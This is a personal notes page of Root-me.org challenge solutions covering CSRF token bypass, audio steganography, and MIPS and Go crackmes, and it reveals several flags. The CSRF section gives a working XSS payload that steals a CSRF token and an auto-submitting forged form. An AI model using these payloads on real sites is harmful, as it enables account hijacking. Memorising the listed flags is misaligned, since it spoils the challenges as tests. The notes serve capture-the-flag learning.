---
description: 'Goal is simple : Solve all the challs.'
---

# Root-me.org



I decided to start getting habit of taking note after this tragedy happens \(Thanks @reznok!!!!\)

Again, this is a note so that incase root-me be fucked up again, i can easily got all my flag and solution back, **THIS IS NOT A WRITE UP**.

![sad.png](.gitbook/assets/image%20%284%29.png)

## Web - Client

###  CSRF - token bypass

 First, we must steal the token by using XSS

{% code-tabs %}
{% code-tabs-item title="steal\_token.js" %}
```javascript
<iframe id="iframe" src="/web-client/ch23/?action=profile" onload="read()"></iframe>
<script>
function read()
{
 document.location = document.getElementById("iframe").contentDocument.forms[0].token.value;
}
</script>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Second, we create crsf form that get token and submit request

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>
function get(name){
   if(name=(new RegExp('[?&]'+encodeURIComponent(name)+'=([^&]*)')).exec(location.search))
      document.getElementById("token").value = decodeURIComponent(name[1]);
}
</script>

    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="tuanlinh1" />
      <input type="hidden" name="status" value="on" />
      <input id="token" name="token" value="" />
      <input type="submit" value="Submit request" />
      <script>get('token')</script>
      <script>document.getElementById("csrf").submit()</script>
    </form>

  </body>
</html>

```

![pow](.gitbook/assets/image%20%2881%29.png)

## Steganography

### Some Noise

Reverse it + Slow it down using Audacity

{% file src=".gitbook/assets/out\_flag.mp3" %}

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text
3b27641fc5h0
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Reverse Engineering

### ELF MIPS - BASIC CRACKME

This challenge is quite easy but seems like people hate MIPS, so there are not much solves. It's actually the easiest assembly to read/write so far as i knew and tried.

![](.gitbook/assets/image%20%2883%29.png)

First, program read input from stdin through fgets\(\), and check to see if input string length is equal 19 or not

![](.gitbook/assets/image%20%2813%29.png)

If len\(input\_string\) != 19, then it will lead to bad boy, otherwise, it keep running program

![](.gitbook/assets/image%20%2866%29.png)

Next part is an for loop, where it check to see if \($fp + -0x58 + 4 + i\) == 'i' where i from range\(8, 17\)

Which mean 

```text
>>> hex(-0x58+4+8)
'-0x4c'
>>> hex(-0x58+4+9)
'-0x4b'
>>> hex(-0x58+4+10)
'-0x4a'
>>> hex(-0x58+4+11)
'-0x49'
>>> hex(-0x58+4+12)
'-0x48'
>>> hex(-0x58+4+13)
'-0x47'
>>> hex(-0x58+4+14)
'-0x46'
>>> hex(-0x58+4+15)
'-0x45'
>>> hex(-0x58+4+16)
'-0x44'
>>> hex(-0x58+4+17)
'-0x43'
```

Those memory offset will hold value that equal to "i"

Next is an if statement that check whether an fixed address hold an char it want

![](.gitbook/assets/image%20%2863%29.png)

Which mean

```text
var_4F = var_50 + 3 = "u"
var_50 = "r"
var_51 = "t"
var_53 = "a"
var_54 = "c"
var_4E = "n"
var_52 = "n"
var_4D = "m"
var_43 = "p"
var_42 = "s"
```

Now we can build an string from array from -0x54 to -0x42, which is also flag:

```text
cantrunmiiiiiiiiips
```



### ELF x64 - Golang basic

Config IDA :

![](.gitbook/assets/image%20%2893%29.png)

Thanks god this is not stripped binary :

![](.gitbook/assets/image%20%2855%29.png)

Find main\_main\(\) : 

![](.gitbook/assets/image%20%28100%29.png)

First, that's why loop where it xor your input\_string with "rootme" than compares with an hardcoded byte array

Debug to find which byte array it compares with :

![](.gitbook/assets/image%20%28108%29.png)

{% code-tabs %}
{% code-tabs-item title="solver.py" %}
```python
ida_chars =[
  0x3B, 0x02, 0x23, 0x1B, 0x1B, 0x0C, 0x1C, 0x08, 0x28, 0x1B, 
  0x21, 0x04, 0x1C, 0x0B
]
key = 'rootme'
out = ""
for i in range(0, len(ida_chars)):
	out += chr(ord(key[i%len(key)]) ^ (ida_chars[i]))
print out
print len(out)
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="flag" %}
```text
ImLovingGoLand
```
{% endcode-tabs-item %}
{% endcode-tabs %}

